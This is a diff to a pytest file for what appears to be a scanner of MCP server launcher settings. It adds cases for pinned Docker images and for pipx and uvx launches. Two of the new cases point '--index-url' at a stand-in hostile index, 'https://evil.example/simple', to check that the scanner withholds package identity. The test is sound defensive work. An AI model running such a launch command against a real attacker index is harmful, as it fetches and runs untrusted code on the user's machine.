@@ -102,6 +102,12 @@ def test_path_qualified_launcher_is_classified_without_registry_identity(
         ("/usr/local/bin/npx", ["-y", "pkg@1.2.3"], "1.2.3"),
         ("C:\\private-dir\\uvx.exe", ["pkg==1.2.3"], "1.2.3"),
         ("npx.cmd", ["-y", "pkg@1.2.3"], "1.2.3"),
+        (
+            "docker.exe",
+            ["run", "-i", "--rm", "registry.test/team/server@sha256:" + "a" * 64],
+            "sha256:" + "a" * 64,
+        ),
+        ("docker.exe", ["run", "-i", "--rm", "registry.test/team/server:1.2.3"], "1.2.3"),
     ],
 )
 def test_normalized_launcher_records_exact_pins(tmp_path, command, args, version):
@@ -109,6 +115,31 @@ def test_normalized_launcher_records_exact_pins(tmp_path, command, args, version
     assert server.version == version
     assert server.version_pinned is True
     assert ("high", "version_pinning") not in findings(server)
+
+
+@pytest.mark.parametrize(
+    "command,args",
+    [
+        (
+            "pipx.exe",
+            [
+                "run",
+                "--spec",
+                "some-mcp-server",
+                "--index-url",
+                "https://evil.example/simple",
+                "srv",
+            ],
+        ),
+        (
+            "uvx.exe",
+            ["--from", "some-mcp-server", "--index-url", "https://evil.example/simple", "srv"],
+        ),
+    ],
+)
+def test_suffixed_launcher_with_alternate_index_has_no_identity(tmp_path, command, args):
+    server = scan_server(tmp_path, command, args)
+    assert server.launcher_package is None
 
 
 def test_plain_launcher_output_is_unchanged(tmp_path):
